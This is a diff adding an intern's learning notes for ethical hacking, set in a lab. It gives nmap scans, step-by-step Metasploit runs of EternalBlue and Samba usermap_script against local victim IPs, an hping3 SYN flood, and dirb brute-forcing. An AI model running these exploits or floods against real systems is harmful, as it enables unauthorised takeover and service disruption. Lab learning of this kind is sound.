@@ -1,0 +1,106 @@
+Dlithe
+Cyber Security Internship
+
+
+Hi Everyone, I'm Darshan Kumar B K from Bangalore. I'm Interested in Ethical Hacking and Programming. I've have take up an internship at Dlithe.
+I will be posting all the learning and practical implementations.
+
+
+Port Scanning (nmap)
+
+nmap command is used for port scanning.All the open ports will be displayed along with its service. In the above scan port 53/tcp is open for domain service.
+$ nmap -A 192.168.31.1
+
+$ nmap -sn 192.168.31.0/24
+This command show all the connected and running (host is up) devices on the network (router). 0/24 means 0 to 255
+all the devices on the networkIf nmap is not picking up any ports, then victim machine's firewall has to be turned off.
+
+
+Vulnerability Scanning
+
+Tools: Nessus, Burpsuite, AppSpider.
+
+
+
+Exploitation
+
+Steps:
+Initialize metasploit database
+
+$ sudo msfdb init
+Start postgresql database
+
+$ sudo service postgresql start
+Open metasploit console
+
+$ msfconsole
+Search for the exploit script using CVE or Vulnerability name
+
+msf6> search eternalblue
+Import the exploit for the existing vulnerability
+
+msf6> use exploit/windows/smb/ms17_010_eternalblue
+Check info of the exploit
+
+msf6 exploit(windows/smb/ms17_010_eternalblue) > info
+Set the required details of exploit like RHOSTS with victim's IP address
+
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.0.110
+Initiate the attack
+
+msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
+After successful attack it shows meterpreter> which is the RCE. To check the commands use
+
+meterpreter> help
+Now we own the victim's computer, let's try screenshot command to capture victim's screen.
+
+meterpreter> screenshot
+Victim's Screen
+
+
+Hacking Linux System Using Metasploit
+
+Steps:
+Initialize metasploit database
+
+$ sudo msfdb init
+Start postgresql database
+
+$ sudo service postgresql start
+Open metasploit console
+
+$ msfconsole
+Search for the exploit script using CVE or Vulnerability name
+
+msf6> search usermap_script
+Import the exploit for existing vulnerability
+
+msf6> use exploit/multi/samba/usermap_script
+Check the info of the exploit
+
+msf6 exploit(multi/samba/usermap_script) > info
+Set the required options like RHOSTS, to initiate the attack
+
+msf6 exploit(multi/samba/usermap_script) > set RHOSTS 192.168.0.111
+Initiate the attack
+
+msf6 exploit(multi/samba/usermap_script) > exploit
+
+sessions -i
+Now we got control of victim's computer. Lets try to access a file which belongs to victim ( Linux System ). The file is located in /home/msfadmin,
+let us navigate to the current folder and view the content of text file.
+
+
+DoS Attack
+
+$ hping3 -S -p 445 192.168.31.71
+First port scanning is done to check if the victim is up and the ports are open. Then a particular port may be selected for attack using -p 445 option. -S is only SYN flag the attacker will not wait for ACK. In the above only 7 packets are sent in 10 seconds.
+
+$ hping3 -S -p 445 192.168.31.71 - flood
+The above option of hping3 - flood will flood packets to the victim's computer without waiting for acknowledgement.
+
+
+Web Application Penetration Testing Methodology
+
+$ dirb http://192.168.31.138
+directory bruteforceThe above dirb command does directory bruteforce attack to find all the hidden hyperlinks.
